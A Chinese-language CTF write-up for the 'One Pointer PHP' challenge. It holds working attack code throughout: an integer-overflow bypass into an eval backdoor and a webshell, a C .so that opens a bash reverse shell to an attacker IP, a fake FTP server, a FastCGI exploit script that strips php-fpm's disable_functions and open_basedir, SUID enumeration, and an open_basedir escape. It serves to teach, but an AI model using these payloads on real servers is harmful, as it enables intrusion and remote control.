@@ -1,0 +1,512 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<p>最近在看<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">FPM/Fastcgi未授权漏洞</span></strong></span>，感觉自己还不太熟悉所以没敢写关于这个漏洞的文章，但是利用还是很简单的。这一题就是用的这个，不得不说这一道题考的是真狠，把权限全都给拿走了，提权过程中的思路是最痛苦的。一起来看看吧！</p>
+<p>题目可以在<a class="link-info" href="https://buuoj.cn/" title="buuctf">buuctf</a>平台复现。</p>
+<h1>源码解读</h1>
+<p><img alt="" height="406" src="image\cc965b5d91444483ae393fe37cf166e4.png" width="334"/></p>
+<p>首先，题目给了我们源码，直接打开看看，发现有两个文件，代码都非常的简短。</p>
+<pre><code class="language-php">add_api.php
+
+&lt;?php
+show_source(__FILE__);
+include "user.php";
+if($user=unserialize($_COOKIE["data"])){
+	$count[++$user-&gt;count]=1;
+	if($count[]=1){
+		$user-&gt;count+=1;
+		setcookie("data",serialize($user));
+	}else{
+		eval($_GET["backdoor"]);
+	}
+}else{
+	$user=new User;
+	$user-&gt;count=1;
+	setcookie("data",serialize($user));
+}
+?&gt;</code></pre>
+<pre><code class="language-php">user.php
+
+&lt;?php
+class User{
+	public $count;
+}
+?&gt;</code></pre>
+<h2>第一层----溢出</h2>
+<p>代码也不难读懂，大体意思就是存了一个序列化的数据，把他反序列化后的数据处理后在if中进行$count[]=1，这是一个赋值操作而不是判断，这个点感觉.........好熟悉啊..........</p>
+<p><img alt="" height="258" src="image\e70243f5746d479bba1b39393c5b0275.png" width="461"/></p>
+<p>这不就是我之前做<a class="link-info" href="https://blog.csdn.net/qq_51295677/article/details/123553316?spm=1001.2014.3001.5502" title="卷王杯">卷王杯</a>时绕的一模一样的套路吗？这里不细讲了，我<strong>CTFSHOW卷王杯</strong>的<strong>easyweb</strong>写了就不细写了，不懂的可以自己去看看哈！</p>
+<p>大概绕过思路就是，由于是赋值操作，而<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$count[]=1</span></strong></span>是对<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">$count</span></strong></span>数组的最后一个赋值，如果我们使得上一位达到一个int的最大值，当它自增过后数组不能再赋值了，一旦往后面赋值就会溢出，进而报错。这里我们需要了解到int的最大溢出值为多少，之前也说过这个int最大取值还是得看操作系统的位数，若操作系统为<strong>32位</strong>的int最大取值为<strong><span style="background-color:#fef2f0;">2147483647</span></strong>，<strong>64位</strong>的最大取值为<strong><span style="background-color:#fef2f0;">9223372036854775807</span></strong>，现在的操作系统基本都是<strong>64位</strong>的了，所以我们用<strong>64位</strong>的解，因为上面会自增一次，所以我们<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">count</span></strong></span>取值为<strong><span style="background-color:#fef2f0;">9223372036854775806</span></strong>。</p>
+<p><img alt="" height="406" src="image\152877564b744500953f02a3831e1015.png" width="1200"/></p>
+<p> 把这个数据用url解码，看一下，</p>
+<pre><code class="language-php">O:4:"User":1:{s:5:"count";i:1;}</code></pre>
+<p>把<strong>1</strong>修改为我们的<strong>count</strong>值然后再进行<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">url编码</span></strong></span>然后在放入在<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">cookie</span></strong></span>的<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">data</span></strong></span>值即可，再利用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">backdoor</span></strong></span>参数访问看看<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">phpinfo()</span></strong></span>，</p>
+<p><img alt="" height="817" src="image\384295154be648c791b8b9bd347c441f.png" width="1200"/></p>
+<p> 说明我们已经绕过了第一层的溢出！</p>
+<p></p>
+<h2>第二层----“假”的一句话</h2>
+<p>既然可以控制<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">backdoor</span></strong></span>参数，我们不妨直接写一个一句话如下，</p>
+<pre><code>?backdoor=eval($_POST['wllm']);</code></pre>
+<p>用POST传参试试这个行不行，</p>
+<p><img alt="" height="841" src="image\dfa61b61180748428f27b741fd048957.png" width="1200"/></p>
+<p>可以，所以我们用这个连接一句话，但是这里有个需要注意的小点，因为我们需要控制COOKIE的数据所以我们需要在蚁剑的请求数据中放入我们的COOKIE数据(有两条，以分号断开)。</p>
+<p><img alt="" height="377" src="image\97c8b7052a0748769d5a7e8d6f17fc2c.png" width="463"/></p>
+<p> <img alt="" height="467" src="image\672a808158ba4e41baaee6836cca078b.png" width="1200"/></p>
+<p> 连接上了，我们找一下flag，在根目录下发现flag，但是打开是空白的，假flag？不并不是，看下图</p>
+<p><img alt="" height="736" src="image\354b1da7b74c41e7b08511f7f35b306f.png" width="1200"/></p>
+<p>flag文件的大小是43b，说明有数据，但是为啥打开空白呢？我们把这个文件下载到本地看看，</p>
+<p><img alt="" height="187" src="image\e1481359837a4eb68e9a9cf252594313.png" width="434"/></p>
+<p>它报错了-----<span style="background-color:#fefcd8;">Can Not Read.</span></p>
+<p>这说明我们没有权限去读取这玩意儿，再看看终端，</p>
+<p><img alt="" height="334" src="image\a4f92bc0b1934cddb27bfcbed818b702.png" width="1018"/> 换谁谁不迷糊，搞了这么久的蚁剑，最后拿到以后屁用没有，所以我们目前的一句话居然是"假"的。</p>
+<p></p>
+<h2>第三层----配置文件的分析</h2>
+<p> 既然利用不上蚁剑，我们就想一想能不能利用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">LD_PRELOAD</span></strong></span>劫持搞一搞，先看看<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">phpinfo()</span></strong></span>中的<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">disable_functions</span></strong></span>，看看能不能利用到<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">putenv()</span></strong></span>函数。</p>
+<p><img alt="" height="273" src="image\41f071fa86624eab90bef05af93bf347.png" width="1184"/></p>
+<p>还是太年轻了，到这里我就开始自闭了，因为已经不知道该怎么下手了。在其它师傅的文章中我开始了解<span style="background-color:#fefcd8;">CGI、Fastcgi、FPM未授权</span>等等，一起看看吧！前面我说拿到蚁剑没用，但不尽然，我们拿到的蚁剑没有权限是因为<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">open_basedir</span></strong></span>这个配置文件的设置</p>
+<p><img alt="" height="486" src="image\282658e58f2a48c5834bc44f261999b1.png" width="1178"/> 由于<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">open_basedir</span></strong></span>对目录的限制使得我们只能对<span style="background-color:#fefcd8;">/var/www/html</span>下的文件进行操作，但是我们访问一下<span style="background-color:#fefcd8;">/etc/passwd</span>发现</p>
+<p><img alt="" height="508" src="image\b96bc6bdba4446678e52712c34565477.png" width="995"/></p>
+<p>虽然<strong>flag</strong>不能读，但是<strong>passwd</strong>可以，也就是说其它的也行，既然可以读，这也就够了，我们可以看看<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">php.ini</span></strong></span>配置文件以及<strong>nginx</strong>配置文件。</p>
+<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">php.ini</span></strong></span>配置文件路径：<strong><span style="background-color:#fefcd8;">/usr/local/etc/php/php.ini</span></strong>，这种配置文件的路径在不同的web服务器搭建是不同的比如我的服务器web是用<strong>phpstudy</strong>搭建的和<strong>宝塔</strong>搭的配置文件就不太相同，所以这题的配置文件是可以自己一个一个找出来。</p>
+<p><img alt="" height="639" src="image\422658f42bee426cb21dce7ded6ccda3.png" width="1200"/></p>
+<p>看其它的师傅说这里可以pwn，由于我是纯web狗就没有深看这个方法。</p>
+<p>我们来下一个web法，看<strong>nginx</strong>默认配置文件，路径为：<span style="background-color:#fefcd8;">/etc/nginx/sites-enabled/default</span></p>
+<p><img alt="" height="679" src="image\d01b9d1b724d4be0bd6be51787f7e0c1.png" width="794"/></p>
+<p> 这是一个<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">fastcgi</span></strong></span>开启的情况，以后我熟练了这个再把<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">fastcgi</span></strong></span>单独列出一篇文章来讲透它。到这里我们就差不多已经可以断定了，这里利用<strong>FPM未授权漏洞</strong>对其使用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">RCE攻击</span></strong></span>。</p>
+<p></p>
+<h2>第四层----FPM未授权</h2>
+<p>如果知道<strong>FPM</strong>的工作原理对这个题目的<strong>payload</strong>构造会有更深的理解，当然如果不知道也没关系，因为我在网上翻了翻，发现<strong>payload</strong>好像是继承过来的一样，从漏洞发现到现在一直用的是同一个<strong>payload</strong>。所以不用担心看不懂，就当作是一个脚本小子即可。</p>
+<h3>1.构造恶意so文件</h3>
+<p>首先我们需要构造一个上一篇<a class="link-info" href="https://blog.csdn.net/qq_51295677/article/details/124338635?spm=1001.2014.3001.5502" title="文章LD_PRELOAD">文章LD_PRELOAD</a>最后讲的那个不需要依赖函数的利用方法。我们首先在Linux环境下创建一个C文件，</p>
+<pre><code class="language-cpp">#define _GNU_SOURCE
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+__attribute__ ((__constructor__)) void preload (void){
+    system("bash -c 'bash -i &gt;&amp; /dev/tcp/your_IP/2333 0&gt;&amp;1'");
+}</code></pre>
+<p>这里我们构造的目的是想要把shell弹到我们的服务器上去。接下来就是把它编译为库链接文件<strong>.so</strong>后缀，然后把这个<strong>.so</strong>文件放入<strong>/html</strong>目录下。</p>
+<p><img alt="" height="82" src="image\9d3d5580ee194045bdcb2bc1fd2a9108.png" width="722"/></p>
+<p><img alt="" height="437" src="image\e4018ce30e0843ef91543a03ba1d824a.png" width="998"/> </p>
+<p>在搞个接受文件的php，这个文件的作用是接收恶意的fastcdi请求文件并写回主机，为什么可以这样需要了解fastcgi的原理有兴趣的朋友可以去看相关的文章，这里我理解不深不敢乱说，就继续下面了。</p>
+<pre><code class="language-php">file.php
+&lt;?php
+    $file = $_GET['file'] ?? '/tmp/file';
+    $data = $_GET['data'] ?? ':)';
+    echo($file."&lt;/br&gt;".$data."&lt;/br&gt;");
+    var_dump(file_put_contents($file, $data));
+?&gt;
+</code></pre>
+<p> 这个文件是我拿一个师傅的，当然也可以不写这个文件，因为我们<strong>backdoor</strong>变量是在<strong>eval函数</strong>下的，我们可以直接用<strong>backdoor</strong>接收php代码。</p>
+<h3>2.构造恶意FTP服务</h3>
+<p><strong>file变量</strong>是用来利用我们服务器伪造的<strong>FTP</strong>恶意代码的，当<strong>ftp</strong>建立连接后，会通过被动模式将<strong>payload</strong>重定向到目标主机本地<strong>9001</strong>端口的<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">php-fpm</span></strong></span>上，并会成功反弹shell到我们的服务器上，所以我们要开两台服务器窗口，一台用来运行FTP，一台用来监听返回的数据。</p>
+<pre><code class="language-python">import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+s.bind(('0.0.0.0', 9999))#这里是ftp的端口
+s.listen(1)
+conn, addr = s.accept()
+conn.send(b'220 welcome\n')
+#Service ready for new user.
+#Client send anonymous username
+#USER anonymous
+conn.send(b'331 Please specify the password.\n')
+#User name okay, need password.
+#Client send anonymous password.
+#PASS anonymous
+conn.send(b'230 Login successful.\n')
+#User logged in, proceed. Logged out if appropriate.
+#TYPE I
+conn.send(b'200 Switching to Binary mode.\n')
+#Size /
+conn.send(b'550 Could not get the file size.\n')
+#EPSV (1)
+conn.send(b'150 ok\n')
+#PASV
+conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2)
+conn.send(b'150 Permission denied.\n')
+#QUIT
+conn.send(b'221 Goodbye.\n')
+conn.close()</code></pre>
+<p>这个恶意伪造的<strong>FTP服务</strong>代码放我们服务器用<strong>python</strong>环境运行。另外我们<strong>FTP</strong>监听的这个端口要在服务器中打开，不然监听不到。</p>
+<h3>3.构造恶意Fastcgi请求</h3>
+<p>这个脚本很长，看着很吓人，但是我们只要知道一件事，这是一个现成的脚本是一个从漏洞发现至今一直没变的一串数据，我们不需要修改什么东西，最关键的是最下面$params中的数据了，其它的可以照搬。</p>
+<pre><code class="language-php">&lt;?php
+/**
+ * Note : Code is released under the GNU LGPL
+ *
+ * Please do not change the header of this file
+ *
+ * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
+ * Lesser General Public License as published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ *
+ * See the GNU Lesser General Public License for more details.
+ */
+/**
+ * Handles communication with a FastCGI application
+ *
+ * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
+ * @version     1.0
+ */
+class FCGIClient
+{
+    const VERSION_1            = 1;
+    const BEGIN_REQUEST        = 1;
+    const ABORT_REQUEST        = 2;
+    const END_REQUEST          = 3;
+    const PARAMS               = 4;
+    const STDIN                = 5;
+    const STDOUT               = 6;
+    const STDERR               = 7;
+    const DATA                 = 8;
+    const GET_VALUES           = 9;
+    const GET_VALUES_RESULT    = 10;
+    const UNKNOWN_TYPE         = 11;
+    const MAXTYPE              = self::UNKNOWN_TYPE;
+    const RESPONDER            = 1;
+    const AUTHORIZER           = 2;
+    const FILTER               = 3;
+    const REQUEST_COMPLETE     = 0;
+    const CANT_MPX_CONN        = 1;
+    const OVERLOADED           = 2;
+    const UNKNOWN_ROLE         = 3;
+    const MAX_CONNS            = 'MAX_CONNS';
+    const MAX_REQS             = 'MAX_REQS';
+    const MPXS_CONNS           = 'MPXS_CONNS';
+    const HEADER_LEN           = 8;
+    /**
+     * Socket
+     * @var Resource
+     */
+    private $_sock = null;
+    /**
+     * Host
+     * @var String
+     */
+    private $_host = null;
+    /**
+     * Port
+     * @var Integer
+     */
+    private $_port = null;
+    /**
+     * Keep Alive
+     * @var Boolean
+     */
+    private $_keepAlive = false;
+    /**
+     * Constructor
+     *
+     * @param String $host Host of the FastCGI application
+     * @param Integer $port Port of the FastCGI application
+     */
+    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
+    {
+        $this-&gt;_host = $host;
+        $this-&gt;_port = $port;
+    }
+    /**
+     * Define whether or not the FastCGI application should keep the connection
+     * alive at the end of a request
+     *
+     * @param Boolean $b true if the connection should stay alive, false otherwise
+     */
+    public function setKeepAlive($b)
+    {
+        $this-&gt;_keepAlive = (boolean)$b;
+        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
+            fclose($this-&gt;_sock);
+        }
+    }
+    /**
+     * Get the keep alive status
+     *
+     * @return Boolean true if the connection should stay alive, false otherwise
+     */
+    public function getKeepAlive()
+    {
+        return $this-&gt;_keepAlive;
+    }
+    /**
+     * Create a connection to the FastCGI application
+     */
+    private function connect()
+    {
+        if (!$this-&gt;_sock) {
+            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
+            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
+            if (!$this-&gt;_sock) {
+                throw new Exception('Unable to connect to FastCGI application');
+            }
+        }
+    }
+    /**
+     * Build a FastCGI packet
+     *
+     * @param Integer $type Type of the packet
+     * @param String $content Content of the packet
+     * @param Integer $requestId RequestId
+     */
+    private function buildPacket($type, $content, $requestId = 1)
+    {
+        $clen = strlen($content);
+        return chr(self::VERSION_1)         /* version */
+            . chr($type)                    /* type */
+            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
+            . chr($requestId &amp; 0xFF)        /* requestIdB0 */
+            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
+            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
+            . chr(0)                        /* paddingLength */
+            . chr(0)                        /* reserved */
+            . $content;                     /* content */
+    }
+    /**
+     * Build an FastCGI Name value pair
+     *
+     * @param String $name Name
+     * @param String $value Value
+     * @return String FastCGI Name value pair
+     */
+    private function buildNvpair($name, $value)
+    {
+        $nlen = strlen($name);
+        $vlen = strlen($value);
+        if ($nlen &lt; 128) {
+            /* nameLengthB0 */
+            $nvpair = chr($nlen);
+        } else {
+            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
+        }
+        if ($vlen &lt; 128) {
+            /* valueLengthB0 */
+            $nvpair .= chr($vlen);
+        } else {
+            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
+        }
+        /* nameData &amp; valueData */
+        return $nvpair . $name . $value;
+    }
+    /**
+     * Read a set of FastCGI Name value pairs
+     *
+     * @param String $data Data containing the set of FastCGI NVPair
+     * @return array of NVPair
+     */
+    private function readNvpair($data, $length = null)
+    {
+        $array = array();
+        if ($length === null) {
+            $length = strlen($data);
+        }
+        $p = 0;
+        while ($p != $length) {
+            $nlen = ord($data{$p++});
+            if ($nlen &gt;= 128) {
+                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $nlen |= (ord($data{$p++}));
+            }
+            $vlen = ord($data{$p++});
+            if ($vlen &gt;= 128) {
+                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
+                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
+                $vlen |= (ord($data{$p++}));
+            }
+            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
+            $p += ($nlen + $vlen);
+        }
+        return $array;
+    }
+    /**
+     * Decode a FastCGI Packet
+     *
+     * @param String $data String containing all the packet
+     * @return array
+     */
+    private function decodePacketHeader($data)
+    {
+        $ret = array();
+        $ret['version']       = ord($data{0});
+        $ret['type']          = ord($data{1});
+        $ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
+        $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
+        $ret['paddingLength'] = ord($data{6});
+        $ret['reserved']      = ord($data{7});
+        return $ret;
+    }
+    /**
+     * Read a FastCGI Packet
+     *
+     * @return array
+     */
+    private function readPacket()
+    {
+        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
+            $resp = $this-&gt;decodePacketHeader($packet);
+            $resp['content'] = '';
+            if ($resp['contentLength']) {
+                $len  = $resp['contentLength'];
+                while ($len &amp;&amp; $buf=fread($this-&gt;_sock, $len)) {
+                    $len -= strlen($buf);
+                    $resp['content'] .= $buf;
+                }
+            }
+            if ($resp['paddingLength']) {
+                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
+            }
+            return $resp;
+        } else {
+            return false;
+        }
+    }
+    /**
+     * Get Informations on the FastCGI application
+     *
+     * @param array $requestedInfo information to retrieve
+     * @return array
+     */
+    public function getValues(array $requestedInfo)
+    {
+        $this-&gt;connect();
+        $request = '';
+        foreach ($requestedInfo as $info) {
+            $request .= $this-&gt;buildNvpair($info, '');
+        }
+        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
+        $resp = $this-&gt;readPacket();
+        if ($resp['type'] == self::GET_VALUES_RESULT) {
+            return $this-&gt;readNvpair($resp['content'], $resp['length']);
+        } else {
+            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
+        }
+    }
+    /**
+     * Execute a request to the FastCGI application
+     *
+     * @param array $params Array of parameters
+     * @param String $stdin Content
+     * @return String
+     */
+    public function request(array $params, $stdin)
+    {
+        $response = '';
+//        $this-&gt;connect();
+        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_repeat(chr(0), 5));
+        $paramsRequest = '';
+        foreach ($params as $key =&gt; $value) {
+            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
+        }
+        if ($paramsRequest) {
+            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
+        }
+        $request .= $this-&gt;buildPacket(self::PARAMS, '');
+        if ($stdin) {
+            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
+        }
+        $request .= $this-&gt;buildPacket(self::STDIN, '');
+        echo('?file=ftp://ip:9999/&amp;data='.urlencode($request));
+//        fwrite($this-&gt;_sock, $request);
+//        do {
+//            $resp = $this-&gt;readPacket();
+//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
+//                $response .= $resp['content'];
+//            }
+//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
+//        var_dump($resp);
+//        if (!is_array($resp)) {
+//            throw new Exception('Bad request');
+//        }
+//        switch (ord($resp['content']{4})) {
+//            case self::CANT_MPX_CONN:
+//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
+//                break;
+//            case self::OVERLOADED:
+//                throw new Exception('New request rejected; too busy [OVERLOADED]');
+//                break;
+//            case self::UNKNOWN_ROLE:
+//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
+//                break;
+//            case self::REQUEST_COMPLETE:
+//                return $response;
+//        }
+    }
+}
+?&gt;
+&lt;?php
+// real exploit start here
+//if (!isset($_REQUEST['cmd'])) {
+//    die("Check your input\n");
+//}
+//if (!isset($_REQUEST['filepath'])) {
+//    $filepath = __FILE__;
+//}else{
+//    $filepath = $_REQUEST['filepath'];
+//}
+
+$filepath = "/var/www/html/add_api.php";
+$req = '/'.basename($filepath);
+$uri = $req .'?'.'command=whoami';
+$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
+$code = "&lt;?php system(\$_REQUEST['command']); phpinfo(); ?&gt;"; // php payload -- Doesnt do anything
+$php_value = "unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = payload.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "; // extension_dir即为.so文件所在目录
+$params = array(
+    'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
+    'REQUEST_METHOD'    =&gt; 'POST',
+    'SCRIPT_FILENAME'   =&gt; $filepath,
+    'SCRIPT_NAME'       =&gt; $req,
+    'QUERY_STRING'      =&gt; 'command=whoami',
+    'REQUEST_URI'       =&gt; $uri,
+    'DOCUMENT_URI'      =&gt; $req,
+#'DOCUMENT_ROOT'     =&gt; '/',
+    'PHP_VALUE'         =&gt; $php_value,
+    'SERVER_SOFTWARE'   =&gt; 'ctfking/Tajang',
+    'REMOTE_ADDR'       =&gt; '127.0.0.1',
+    'REMOTE_PORT'       =&gt; '9001', // 找准服务端口
+    'SERVER_ADDR'       =&gt; '127.0.0.1',
+    'SERVER_PORT'       =&gt; '80',
+    'SERVER_NAME'       =&gt; 'localhost',
+    'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
+    'CONTENT_LENGTH'    =&gt; strlen($code)
+);
+// print_r($_REQUEST);
+// print_r($params);
+//echo "Call: $uri\n\n";
+echo $client-&gt;request($params, $code)."\n";
+?&gt;
+</code></pre>
+<p>运行一下这个脚本得到如下payload，</p>
+<p><img alt="" height="647" src="image\db14591f1e494805ba185824f802347c.png" width="1200"/></p>
+<p> </p>
+<h3>4.打入payload</h3>
+<p>先把恶意FTP挂起来</p>
+<p><img alt="" height="604" src="image\c68d907a7034446b9db0c4b6d26146e5.png" width="682"/></p>
+<p> 再把2333的端口监听上，</p>
+<p><img alt="" height="72" src="image\d5325a54045048f1a7f2d5d35ba7287e.png" width="519"/></p>
+<p> 再把payload打入</p>
+<p><img alt="" height="872" src="image\8723cc27638244d895173dd7c7a0804d.png" width="1200"/></p>
+<p>可以看到，shell被反弹到我们的服务器上去了。</p>
+<p>你以为这就完了吗？no！！</p>
+<p><img alt="" height="517" src="image\37cadfc3987643b38b38a4f667bc497d.png" width="393"/></p>
+<p>提取提取，这个题目这么喜欢考提权。这里我们用到一条<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">suid提权</span></strong></span>指令，</p>
+<pre><code class="language-bash">find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+<p><img alt="" height="235" src="image\97d890e6511e48eda2fd7347f01488e3.png" width="538"/></p>
+<p>这个过程可能有点慢，我们可以看到<span style="background-color:#fefcd8;">/usr/local/bin/php</span>这一条，说明php有权限使用<strong>php -a</strong>进入交互模式，直接读取数据并不可以，我们可以用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">ini_set()</span></strong></span>把<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">open_basedir</span></strong></span>变量指向根目录再读取，payload如下，</p>
+<pre><code class="language-php">mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/flag'));</code></pre>
+<p><img alt="" height="181" src="image\c3b7581127c348d9ac21169f64d4f26a.png" width="752"/></p>
+<p> flag就出了，获得这个flag真是太艰难了！！</p>
+<p></p>
+<p></p>
+<p>参考：<a href="https://forum.90sec.com/t/topic/129" title="PHP 连接方式介绍以及如何攻击 PHP-FPM - 信安之路 - 90Sec">PHP 连接方式介绍以及如何攻击 PHP-FPM - 信安之路 - 90Sec</a></p>
+<p><a href="https://blog.csdn.net/baidu_39504221/article/details/116720875" title="[蓝帽杯 2021]One Pointer PHP_L1s4的博客-CSDN博客">[蓝帽杯 2021]One Pointer PHP_L1s4的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_45619909/article/details/121484875" title="蓝帽杯2021 One Pointer PHP_Tajang的博客-CSDN博客">蓝帽杯2021 One Pointer PHP_Tajang的博客-CSDN博客</a></p>
+<p><a href="https://baynk.blog.csdn.net/article/details/116546838" title="CTF one_Pointer_php  2021 蓝帽杯 WriteUp_baynk的博客-CSDN博客">CTF one_Pointer_php 2021 蓝帽杯 WriteUp_baynk的博客-CSDN博客</a></p>
+</div>
+</div>
